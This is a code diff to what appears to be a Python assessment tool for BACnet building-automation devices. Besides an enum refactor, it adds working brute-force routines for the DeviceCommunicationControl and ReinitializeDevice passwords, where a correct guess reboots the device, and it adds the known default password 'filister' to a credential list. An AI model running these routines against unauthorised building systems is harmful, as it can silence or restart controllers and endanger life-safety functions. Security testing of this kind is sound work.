@@ -6,13 +6,14 @@ BACnet/SC, write testing, writable enumeration, and OOS checks.
 """
 
 import asyncio
-from typing import List
+from typing import List, Optional
 
 from ..constants import (
     _load_bacpypes3,
     CONTROL_POINT_TYPES,
     BACNET_PRIORITY_LEVELS,
 )
+from oida.utils.common_types import Category
 
 
 class SecurityMixin:
@@ -104,7 +105,7 @@ class SecurityMixin:
         if self.devices:
             self.logger.security_finding(
                 "Anonymous access",
-                category="ACCESS_CONTROL",
+                category=Category.ACCESS_CONTROL,
                 detail="Anonymous read access enabled - no authentication required",
             )
             vulns.append("Anonymous read access - no authentication required")
@@ -165,7 +166,7 @@ class SecurityMixin:
                         if success:
                             self.logger.security_finding(
                                 "Writable access",
-                                category="ACCESS_CONTROL",
+                                category=Category.ACCESS_CONTROL,
                                 detail=f"Anonymous write access on {obj_type}:{instance}",
                             )
                             return
@@ -205,7 +206,7 @@ class SecurityMixin:
         if writable_count > 0:
             self.logger.security_finding(
                 "Writable access",
-                category="ACCESS_CONTROL",
+                category=Category.ACCESS_CONTROL,
                 detail=f"Found {writable_count} writable control points",
             )
 
@@ -362,6 +363,12 @@ class SecurityMixin:
             "Schneider",
             "alerton",
             "Alerton",
+            # Documented stack/library defaults. "filister" is the bacnet-stack
+            # (bacserv / Steve Karg reference stack) default DCC + Reinitialize
+            # password — extremely common on demo gear and devices built on it.
+            "filister",
+            "Filister",
+            "FILISTER",
         ]
 
     async def _bacpypes3_check_auth(self, app, target_addr, device_id: int, timeout: float):
@@ -393,7 +400,7 @@ class SecurityMixin:
             if response and not isinstance(response, (AbortPDU, ErrorPDU, RejectPDU, Error)):
                 self.logger.security_finding(
                     "Anonymous access",
-                    category="ACCESS_CONTROL",
+                    category=Category.ACCESS_CONTROL,
                     detail="Anonymous READ access allowed",
                 )
                 findings.append("Anonymous read access enabled - no authentication required")
@@ -417,7 +424,7 @@ class SecurityMixin:
                 if response and not isinstance(response, (AbortPDU, ErrorPDU, RejectPDU, Error)):
                     self.logger.security_finding(
                         "Insecure configuration",
-                        category="ACCESS_CONTROL",
+                        category=Category.ACCESS_CONTROL,
                         detail=f"Password property '{prop}' is readable",
                     )
                     findings.append(f"Password property '{prop}' is readable")
@@ -452,66 +459,121 @@ class SecurityMixin:
         else:
             self.logger.success("  No obvious authentication weaknesses found")
 
-    async def _bacpypes3_brute_force(self, app, target_addr, device_id: int, timeout: float):
-        """Brute force password testing for BACnet protected operations"""
+    async def _bacpypes3_brute_force_dcc(
+        self, app, target_addr, device_id: int, timeout: float
+    ) -> Optional[str]:
+        """Brute-force the DeviceCommunicationControl password.
+
+        Returns the found password (``""`` for an empty/no-password hit) or None.
+        """
         types = self._load_dcc_types()
-
-        self.logger.display("\n[Password Brute Force]")
-        self.logger.warning("  WARNING: This may trigger alarms or lockouts on the device!")
-
         passwords = self._get_password_list()
+
+        self.logger.display("\n[Brute Force: DeviceCommunicationControl]")
+        self.logger.warning("  WARNING: a correct password lets an attacker mute the device!")
         self.logger.display(f"  Testing {len(passwords)} passwords...")
 
-        found_passwords = []
-
-        self.logger.display("\n  Testing DeviceCommunicationControl passwords...")
-
         for i, password in enumerate(passwords):
-            if i > 0 and i % 10 == 0:
+            if getattr(self.logger, "verbose", False):
+                self.logger.display(
+                    f"    [{i + 1}/{len(passwords)}] trying DCC password '{password or '(empty)'}'"
+                )
+            elif i > 0 and i % 10 == 0:
                 self.logger.display(f"    Progress: {i}/{len(passwords)} tested...")
-
             try:
                 request = self._build_dcc_request(types, password, target_addr)
-
                 try:
                     response = await asyncio.wait_for(
                         app.request(request), timeout=min(timeout, 2.0)
                     )
-
-                    if self._is_success_response(response, types):
-                        display_pass = password if password else "(empty)"
-                        self.logger.security_finding(
-                            "Weak password",
-                            category="AUTHENTICATION",
-                            detail=f"DCC Password found: '{display_pass}'",
-                        )
-                        found_passwords.append(("DeviceCommunicationControl", password))
-                        break
-                    elif isinstance(response, (types["ErrorPDU"], types["Error"])):
-                        continue
-                    elif isinstance(response, (types["AbortPDU"], types["RejectPDU"])):
-                        continue
-
-                except asyncio.TimeoutError as e:
-                    self.logger.debug(f"bacpypes3 brute force failed: {e}")
+                except (asyncio.TimeoutError, TimeoutError) as e:
+                    self.logger.debug(f"bacpypes3 dcc brute force failed: {e}")
                     continue
                 except BaseException as e:
-                    self.logger.debug(f"bacpypes3 brute force failed: {e}")
+                    self.logger.debug(f"bacpypes3 dcc brute force failed: {e}")
                     continue
-
+                if self._is_success_response(response, types):
+                    display_pass = password if password else "(empty)"
+                    self.logger.security_finding(
+                        "Weak password",
+                        category=Category.AUTHENTICATION,
+                        detail=f"DCC Password found: '{display_pass}'",
+                    )
+                    self.logger.success(f"  [Result] DeviceCommunicationControl: '{display_pass}'")
+                    return password
             except BaseException as e:
-                self.logger.debug(f"bacpypes3 brute force failed: {e}")
+                self.logger.debug(f"bacpypes3 dcc brute force failed: {e}")
                 continue
 
-        # Summary
-        self.logger.display("\n  [Brute Force Results]")
-        if found_passwords:
-            for service, password in found_passwords:
-                display_pass = password if password else "(empty/none)"
-                self.logger.success(f"    {service}: '{display_pass}'")
-        else:
-            self.logger.display("    No passwords found (device may not require passwords)")
-            self.logger.display("    Note: Most BACnet devices have NO password protection")
+        self.logger.display("  [Result] DeviceCommunicationControl: no password found")
+        return None
+
+    async def _bacpypes3_brute_force_reinit(
+        self, app, target_addr, device_id: int, timeout: float
+    ) -> Optional[str]:
+        """Brute-force the ReinitializeDevice password.
+
+        ReinitializeDevice uses a SEPARATE password from DCC. Wrong passwords are
+        rejected with a security error (no effect); a hit warm-starts the device
+        once, then we stop. Returns the found password or None.
+        """
+        types = self._load_dcc_types()  # error PDU types for _is_success_response
+        passwords = self._get_password_list()
+        full_types = _load_bacpypes3()
+        ReinitializeDeviceRequest = full_types["ReinitializeDeviceRequest"]
+        RS = full_types["ReinitializeDeviceRequestReinitializedStateOfDevice"]
+        CharacterString = full_types["CharacterString"]
+
+        self.logger.display("\n[Brute Force: ReinitializeDevice]")
+        self.logger.warning("  WARNING: a correct password will warm-start (reboot) the device!")
+        self.logger.display(f"  Testing {len(passwords)} passwords...")
+
+        for i, password in enumerate(passwords):
+            if getattr(self.logger, "verbose", False):
+                self.logger.display(
+                    f"    [{i + 1}/{len(passwords)}] trying reinit password '{password or '(empty)'}'"
+                )
+            elif i > 0 and i % 10 == 0:
+                self.logger.display(f"    Progress: {i}/{len(passwords)} tested...")
+            try:
+                request = ReinitializeDeviceRequest(reinitializedStateOfDevice=RS("warmstart"))
+                if password:
+                    request.password = CharacterString(password)
+                request.pduDestination = target_addr
+                try:
+                    response = await asyncio.wait_for(
+                        app.request(request), timeout=min(timeout, 2.0)
+                    )
+                except (asyncio.TimeoutError, TimeoutError) as e:
+                    self.logger.debug(f"bacpypes3 reinit brute force failed: {e}")
+                    continue
+                except BaseException as e:
+                    self.logger.debug(f"bacpypes3 reinit brute force failed: {e}")
+                    continue
+                if self._is_success_response(response, types):
+                    display_pass = password if password else "(empty)"
+                    self.logger.security_finding(
+                        "Weak password",
+                        category=Category.AUTHENTICATION,
+                        detail=f"ReinitializeDevice password found: '{display_pass}' - device can be reset",
+                    )
+                    self.logger.success(f"  [Result] ReinitializeDevice: '{display_pass}'")
+                    return password
+            except BaseException as e:
+                self.logger.debug(f"bacpypes3 reinit brute force failed: {e}")
+                continue
+
+        self.logger.display("  [Result] ReinitializeDevice: no password found")
+        return None
+
+    async def _bacpypes3_brute_force(self, app, target_addr, device_id: int, timeout: float):
+        """Run all password brute-force attacks (--brute-force convenience).
+
+        Targeted flags (--brute-force-dcc / --brute-force-reinit) drive the
+        per-service methods directly; this just runs both.
+        """
+        await self._bacpypes3_brute_force_dcc(app, target_addr, device_id, timeout)
+        await self._bacpypes3_brute_force_reinit(app, target_addr, device_id, timeout)
 
     async def _bacpypes3_test_dcc(self, app, target_addr, device_id: int, timeout: float):
         """Test DeviceCommunicationControl access"""
@@ -535,7 +597,7 @@ class SecurityMixin:
                         display_pass = password if password else "(empty)"
                         self.logger.security_finding(
                             "Weak password",
-                            category="AUTHENTICATION",
+                            category=Category.AUTHENTICATION,
                             detail=f"DCC accepted with password: '{display_pass}' - device can be disabled",
                         )
                         return
@@ -694,7 +756,7 @@ class SecurityMixin:
             self.logger.display("  [-] No BACnet/SC support detected")
             self.logger.security_finding(
                 "No encryption",
-                category="ENCRYPTION",
+                category=Category.ENCRYPTION,
                 detail="All BACnet/IP traffic is unencrypted - implement BACnet/SC or network segmentation",
             )
 
@@ -848,7 +910,7 @@ class SecurityMixin:
             if critical:
                 self.logger.security_finding(
                     "Writable access",
-                    category="ACCESS_CONTROL",
+                    category=Category.ACCESS_CONTROL,
                     detail=f"Life Safety priorities writable: {critical} - attacker can override life safety controls",
                 )
             operator = [p for p in writable_priorities if p == 8]
@@ -959,7 +1021,7 @@ class SecurityMixin:
         if str(before) != str(after):
             self.logger.security_finding(
                 "Unauthenticated time synchronization",
-                category="ACCESS_CONTROL",
+                category=Category.ACCESS_CONTROL,
                 detail=(
                     "Device applied an unauthenticated TimeSynchronization "
                     f"(localDate/localTime changed {before} -> {after}) - attacker can "
@@ -1064,7 +1126,7 @@ class SecurityMixin:
                     writable.append((obj_type, instance))
                     self.logger.security_finding(
                         "Writable access",
-                        category="ACCESS_CONTROL",
+                        category=Category.ACCESS_CONTROL,
                         detail=f"{obj_type}:{instance} outOfService is writable",
                     )
             except (asyncio.TimeoutError, TimeoutError) as e:
@@ -1080,7 +1142,7 @@ class SecurityMixin:
         if writable:
             self.logger.security_finding(
                 "Writable access",
-                category="ACCESS_CONTROL",
+                category=Category.ACCESS_CONTROL,
                 detail=f"{len(writable)} objects have writable outOfService flag - control loops can be disabled",
             )
         elif not getattr(self.args, "confirm", False) and readable:
